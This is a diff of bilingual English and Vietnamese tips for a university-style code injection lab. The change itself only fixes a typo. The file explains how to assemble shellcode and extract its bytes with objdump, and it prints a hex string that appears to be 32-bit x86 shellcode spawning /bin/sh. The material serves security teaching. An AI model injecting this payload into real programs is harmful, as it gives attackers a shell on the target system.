@@ -1,7 +1,7 @@
 **Tips for code injection lab:**<br>
 1. Write shellcode program in assembly language (sh.asm), compile with nasm (sh.o) then link with ld to generate executable file (sh)<br>
 (Viết chương trình shellcode bằng hợp ngữ, biên dịch (nasm) và liên kết (ld) để tạo chương trình thực thi)
-2. Run the folowing script to get the hex string of shellcode:<br>
+2. Run the following script to get the hex string of shellcode:<br>
 (Chạy bash script dưới đây ở dòng lệnh để tạo chuỗi hex của shellcode:)<br>
 `$> for i in $(objdump -d shell |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo`
 <br>--> hex string generated: `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80`<br>
